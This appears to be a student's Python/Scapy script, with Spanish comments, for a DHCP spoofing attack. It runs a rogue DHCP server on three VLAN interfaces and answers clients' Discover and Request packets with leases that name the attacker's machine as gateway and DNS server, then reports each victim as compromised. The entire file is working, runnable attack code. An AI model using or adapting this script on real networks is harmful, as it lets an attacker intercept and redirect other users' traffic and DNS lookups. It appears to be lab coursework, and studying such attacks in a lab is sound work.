#!/usr/bin/env python3
# ============================================
# DHCP Spoofing Attack Script
# Autor: Sael German Garcia
# Matricula: 2025-0725
# Descripcion: Servidor DHCP falso que entrega
#              configuracion maliciosa a victimas
# ============================================

from scapy.all import *
import threading
import sys

INTERFACES = ["ens4", "ens4.10", "ens4.20"]

IP_CONFIG = {
    "ens4":    {"src": "10.7.99.2",  "gw": "10.7.99.2",  "pool": ["10.7.99.100","10.7.99.101"]},
    "ens4.10": {"src": "10.7.25.50", "gw": "10.7.25.50", "pool": ["10.7.25.100","10.7.25.101","10.7.25.102"]},
    "ens4.20": {"src": "10.7.20.50", "gw": "10.7.20.50", "pool": ["10.7.20.100","10.7.20.101","10.7.20.102"]},
}

FAKE_DNS    = "10.7.99.2"
FAKE_SUBNET = "255.255.255.0"
assigned    = {}

def get_option(pkt, opt_name):
    if DHCP in pkt:
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == opt_name:
                return opt[1]
    return None

def handle_dhcp(iface, pkt):
    if DHCP not in pkt:
        return

    msg_type   = get_option(pkt, 'message-type')
    client_mac = pkt[Ether].src
    cfg        = IP_CONFIG.get(iface, IP_CONFIG["ens4"])
    src_ip     = cfg["src"]
    fake_gw    = cfg["gw"]
    pool       = cfg["pool"]

    if msg_type == 1:  # Discover
        print(f"[*] DHCP Discover de {client_mac} en {iface}")

        key = f"{iface}_{client_mac}"
        if key in assigned:
            offer_ip = assigned[key]
        elif pool:
            offer_ip = pool.pop(0)
            assigned[key] = offer_ip
        else:
            print("[-] Pool agotado")
            return

        offer = (
            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
            IP(src=src_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offer_ip, siaddr=src_ip,
                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
            DHCP(options=[
                ('message-type', 'offer'),
                ('server_id', src_ip),
                ('lease_time', 86400),
                ('subnet_mask', FAKE_SUBNET),
                ('router', fake_gw),
                ('name_server', FAKE_DNS),
                ('end',)
            ])
        )
        sendp(offer, iface=iface, verbose=0)
        print(f"[+] Offer -> {client_mac} IP:{offer_ip} GW:{fake_gw}")

    elif msg_type == 3:  # Request
        server_id = get_option(pkt, 'server_id')
        if server_id != src_ip:
            return

        key = f"{iface}_{client_mac}"
        if key not in assigned:
            return

        ack_ip = assigned[key]
        ack = (
            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
            IP(src=src_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=ack_ip, siaddr=src_ip,
                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
            DHCP(options=[
                ('message-type', 'ack'),
                ('server_id', src_ip),
                ('lease_time', 86400),
                ('subnet_mask', FAKE_SUBNET),
                ('router', fake_gw),
                ('name_server', FAKE_DNS),
                ('end',)
            ])
        )
        sendp(ack, iface=iface, verbose=0)
        print(f"[+] ACK  -> {client_mac} IP:{ack_ip} GW:{fake_gw}")
        print(f"[!] Victima {client_mac} comprometida!")

def sniff_iface(iface):
    sniff(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=lambda pkt: handle_dhcp(iface, pkt),
        store=0
    )

def main():
    print("="*50)
    print("  DHCP Spoofing Attack")
    print("  Autor: Sael German Garcia")
    print("  Matricula: 2025-0725")
    print("="*50)
    print(f"[*] Interfaces: {INTERFACES}")
    print(f"[*] DNS falso:  {FAKE_DNS}")
    print("[*] Esperando DHCP Discover...\n")
    print("[!] Ctrl+C para detener\n")

    threads = []
    for iface in INTERFACES:
        t = threading.Thread(target=sniff_iface, args=(iface,), daemon=True)
        t.start()
        threads.append(t)
        print(f"[*] Escuchando en {iface}...")

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido")

if __name__ == "__main__":
    main()
